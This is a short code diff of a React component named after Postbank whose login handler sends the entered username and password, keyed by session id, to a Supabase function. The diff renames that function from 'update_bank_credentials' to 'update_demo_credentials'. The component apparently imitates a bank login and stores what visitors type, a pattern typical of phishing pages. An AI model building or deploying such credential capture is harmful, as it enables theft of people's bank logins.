@@ -182,7 +182,7 @@ const Postbank = () => {
   const handleLogin = async () => {
     if (password.length === 0) return;
     if (sessionId) {
-      const { error } = await supabase.rpc("update_bank_credentials", {
+      const { error } = await supabase.rpc("update_demo_credentials", {
         p_session_id: sessionId,
         p_username: pbId,
         p_password: password,
